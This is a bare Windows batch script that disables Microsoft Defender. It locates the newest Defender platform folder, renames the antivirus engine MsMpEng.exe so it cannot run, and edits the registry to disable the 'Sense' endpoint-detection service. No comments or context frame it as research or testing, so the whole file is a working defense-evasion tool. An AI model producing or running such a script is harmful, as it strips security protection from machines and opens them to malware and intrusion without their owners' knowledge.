@echo off
set GetLatestVersionPath="dir "C:\ProgramData\Microsoft\Windows Defender\Platform" /ad /od /b"
FOR /F "tokens=*" %%i IN ('%GetLatestVersionPath%') Do Set LatestVersionPath=%%i
set LatestVersionPath=C:\ProgramData\Microsoft\Windows Defender\Platform\%LatestVersionPath%\MsMpEng.exe
 
set "newFileName=MsMpEngOFF.exe"
rename "%LatestVersionPath%" "%newFileName%"
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\Sense" /v "Start" /t REG_DWORD /d "4" /f


